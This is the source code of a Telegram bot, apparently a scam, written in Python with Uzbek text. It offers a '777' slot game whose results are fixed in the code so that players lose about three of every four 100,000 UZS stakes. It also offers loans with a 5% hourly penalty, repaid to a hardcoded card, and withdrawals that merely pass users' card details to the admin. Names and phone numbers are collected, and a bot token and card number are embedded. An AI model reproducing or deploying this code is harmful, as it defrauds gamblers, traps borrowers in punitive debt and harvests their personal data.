import telebot
from telebot import types
import time
import re
from datetime import datetime, timedelta

# --- SOZLAMALAR ---
TOKEN = '8609558089:AAExgvs1_XR5jlj9RGC55zZStvc7nV_Z6hE' # Yangi tokengiz
ADMIN_ID = 5988166567 # Sizning ID raqamingiz
ADMIN_KARTA = "9860 6067 5582 9722" # Qarz to'lash uchun karta

bot = telebot.TeleBot(TOKEN)
users = {}

# Foydalanuvchi ma'lumotlarini olish
def get_user(uid):
    if uid not in users:
        users[uid] = {
            'reg': False, 'name': '', 'phone': '', 'balance': 50000, 
            'loan': 0, 'loan_time': None, 'game_count': 0
        }
    return users[uid]

# Asosiy menyu tugmalari
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🎰 777 O'yini", "💰 Balans")
    markup.row("💳 Pul yechish", "💸 Qarz olish")
    markup.row("🏦 Qarzni to'lash", "👥 Do'stlar")
    return markup

# --- 1. RO'YXATDAN O'TISH ---
@bot.message_handler(commands=['start'])
def start(message):
    user = get_user(message.chat.id)
    # Referal tizimi (5,000 UZS bonus)
    if " " in message.text:
        ref_id = int(message.text.split()[1])
        if ref_id != message.chat.id and ref_id in users:
            users[ref_id]['balance'] += 5000
            bot.send_message(ref_id, "🎁 Do'stingiz qo'shildi! +5,000 UZS bonus.")

    if not user['reg']:
        msg = bot.send_message(message.chat.id, "👋 Salom! Botdan foydalanish uchun Ism va Familiyangizni kiriting:")
        bot.register_next_step_handler(msg, reg_name)
    else:
        bot.send_message(message.chat.id, f"Xush kelibsiz, {user['name']}!", reply_markup=main_menu())

def reg_name(message):
    user = get_user(message.chat.id)
    user['name'] = message.text
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(types.KeyboardButton("📱 Raqamni yuborish", request_contact=True))
    msg = bot.send_message(message.chat.id, "Endi tugma orqali telefon raqamingizni yuboring:", reply_markup=markup)
    bot.register_next_step_handler(msg, reg_phone)

def reg_phone(message):
    user = get_user(message.chat.id)
    if message.contact:
        user['phone'] = message.contact.phone_number
        user['reg'] = True
        bot.send_message(message.chat.id, "✅ Ro'yxatdan o'tdingiz!", reply_markup=main_menu())
        bot.send_message(ADMIN_ID, f"🆕 Yangi user: {user['name']}\n📞 Tel: {user['phone']}")
    else:
        msg = bot.send_message(message.chat.id, "Iltimos, pastdagi tugmani bosing!")
        bot.register_next_step_handler(msg, reg_phone)

# --- 2. 777 O'YINI (3 yutqazib, 1 yutish) ---
@bot.message_handler(func=lambda m: m.text == "🎰 777 O'yini")
def game_777(message):
    user = get_user(message.chat.id)
    if user['balance'] < 100000:
        bot.send_message(message.chat.id, "⚠️ O'yin narxi 100,000 UZS. Balansingiz yetarli emas!")
        return
    
    user['balance'] -= 100000
    user['game_count'] += 1
    bot.send_dice(message.chat.id, emoji='🎰')
    time.sleep(4)
    
    if user['game_count'] % 4 == 0:
        win = 105000
        user['balance'] += win
        bot.send_message(message.chat.id, f"🎊 G'ALABA! +{win:,} UZS berildi!")
    else:
        bot.send_message(message.chat.id, "😟 Omadsiz urinish. Balans: " + str(user['balance']) + " UZS")

# --- 3. QARZ OLISH (Xavfsizlik bilan) ---
@bot.message_handler(func=lambda m: m.text == "💸 Qarz olish")
def loan_start(message):
    user = get_user(message.chat.id)
    if user['loan'] > 0:
        bot.send_message(message.chat.id, "❌ Sizda yopilmagan qarz bor!")
        return
    
    text = ("📜 Qarz shartlari:\n- 12 soatgacha: 0%\n- 12 soatdan keyin: soatiga 5% penya\n"
            "- Limit: 100,000 - 1,000,000 UZS")
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ Roziman", callback_data="l_ok"))
    bot.send_message(message.chat.id, text, reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data == "l_ok")
def loan_ask(call):
    msg = bot.send_message(call.message.chat.id, "💰 Qancha qarz olasiz? (100k - 1mln):")
    bot.register_next_step_handler(msg, loan_final)

def loan_final(message):
    if message.text in ["🎰 777 O'yini", "💰 Balans", "💳 Pul yechish", "💸 Qarz olish", "🏦 Qarzni to'lash"]:
        bot.send_message(message.chat.id, "Jarayon to'xtatildi.", reply_markup=main_menu())
        return

    try:
        amt = int(re.sub(r'\D', '', message.text))
        if 100000 <= amt <= 1000000:
            user = get_user(message.chat.id)
            user['loan'] = amt
            user['balance'] += amt
            user['loan_time'] = datetime.now()
            bot.send_message(message.chat.id, f"✅ {amt:,} UZS berildi. 12 soat ichida qaytaring!")
            bot.send_message(ADMIN_ID, f"🛡 QARZ OLINDI: {user['name']}, {amt:,} UZS")
        else:
            msg = bot.send_message(message.chat.id, "⚠️ Limit: 100,000 - 1,000,000 UZS orasida bo'lishi shart!")
            bot.register_next_step_handler(msg, loan_final)
    except:
        msg = bot.send_message(message.chat.id, "🛑 Faqat raqam kiriting!")
        bot.register_next_step_handler(msg, loan_final)

# --- 4. QARZNI TO'LASH ---
@bot.message_handler(func=lambda m: m.text == "🏦 Qarzni to'lash")
def pay_loan(message):
    user = get_user(message.chat.id)
    if user['loan'] <= 0:
        bot.send_message(message.chat.id, "Qarzingiz yo'q.")
        return
    
    passed = datetime.now() - user['loan_time']
    hours = int(passed.total_seconds() // 3600)
    to_pay = user['loan']
    if hours > 12:
        to_pay += (user['loan'] * 0.05 * (hours - 12))

    msg = bot.send_message(message.chat.id, f"💰 To'lov: {int(to_pay):,} UZS\n💳 Karta: `{ADMIN_KARTA}`\nTo'lagan summani yozing:")
    bot.register_next_step_handler(msg, admin_pay_confirm)

def admin_pay_confirm(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ TASDIQLASH", callback_data=f"ok_{message.chat.id}"),
               types.InlineKeyboardButton("❌ RAD ETISH", callback_data=f"no_{message.chat.id}"))
    bot.send_message(ADMIN_ID, f"🏦 Qarz to'lash so'rovi!\nUser ID: {message.chat.id}\nSumma: {message.text}", reply_markup=markup)
    bot.send_message(message.chat.id, "⌛️ Admin tasdiqlashi kutilmoqda...")

@bot.callback_query_handler(func=lambda c: c.data.startswith(("ok_", "no_")))
def loan_res(call):
    res, uid = call.data.split("_")
    if res == "ok":
        users[int(uid)]['loan'] = 0
        bot.send_message(uid, "✅ Qarzingiz muvaffaqiyatli yopildi!")
    else:
        bot.send_message(uid, "❌ To'lov tasdiqlanmadi!")

# --- 5. PUL YECHISH ---
@bot.message_handler(func=lambda m: m.text == "💳 Pul yechish")
def withdraw(message):
    user = get_user(message.chat.id)
    if user['balance'] < 300000:
        bot.send_message(message.chat.id, "⚠️ Minimal yechish: 300,000 UZS")
        return
    msg = bot.send_message(message.chat.id, "Karta raqami va Ism-familiyangizni yozing:")
    bot.register_next_step_handler(msg, withdraw_admin)

def withdraw_admin(message):
    user = get_user(message.chat.id)
    admin_msg = f"💸 **Yechish!**\n👤 {user['name']}\n💳 {message.text}\n⏰ {datetime.now().strftime('%H:%M %d.%m.%Y')}"
    bot.send_message(ADMIN_ID, admin_msg)
    bot.send_message(message.chat.id, "✅ Adminga yuborildi.")

# --- 6. BALANS VA DO'STLAR ---
@bot.message_handler(func=lambda m: m.text == "💰 Balans")
def check_bal(message):
    user = get_user(message.chat.id)
    bot.send_message(message.chat.id, f"💰 Balans: {user['balance']:,} UZS\n💸 Qarz: {user['loan']:,} UZS")

@bot.message_handler(func=lambda m: m.text == "👥 Do'stlar")
def friends(message):
    link = f"https://t.me/{(bot.get_me()).username}?start={message.chat.id}"
    bot.send_message(message.chat.id, f"🔗 Taklif havolangiz:\n{link}\n\nHar bir do'st uchun 5,000 UZS bonus!")

bot.polling(none_stop=True)
    
        
       

    
            
        
        
    
  
